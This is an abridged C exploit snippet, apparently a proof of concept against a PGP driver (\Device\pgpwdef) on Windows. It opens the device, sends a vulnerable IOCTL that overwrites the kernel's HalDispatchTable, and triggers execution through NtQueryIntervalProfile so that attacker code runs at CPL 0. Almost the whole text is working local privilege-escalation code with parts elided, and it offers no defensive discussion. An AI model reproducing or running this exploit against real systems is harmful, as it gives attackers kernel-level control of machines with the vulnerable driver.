#define IO_CONTROL_VULN 0x80022058
 
#define TARGET_DEVICE L"\\Device\\pgpwdef"
 
[..]
 
    usName.Buffer = TARGET_DEVICE;
    usName.Length = usName.MaximumLength = 
(USHORT)(wcslen(usName.Buffer) * sizeof(WCHAR));
 
    InitializeObjectAttributes(&ObjAttr, &usName, OBJ_CASE_INSENSITIVE , 
NULL, NULL);    
 
 
    // get handle of target devide
    ns = f_NtOpenFile(
        &hDev,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &ObjAttr,
        &StatusBlock,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );
 
[..]
 
    BOOL bStatus = DeviceIoControl(
        hDev,
        IO_CONTROL_VULN,
        InBuff, 0x8,
        OutBuff, 0x8,
        &dwReturnLen, NULL
    );
 
    dwReturnLen = 0;
    bStatus = DeviceIoControl(
        hDev,
        IO_CONTROL_VULN,
        InBuff, sizeof(PVOID),
        (PUCHAR)m_HalDispatchTable, 0,
        &dwReturnLen, NULL
    );
 
[..]
 
    f_NtQueryIntervalProfile(ProfileTotalIssues, &Interval);
 
[..]
 
Your evil code processes with CPL==0
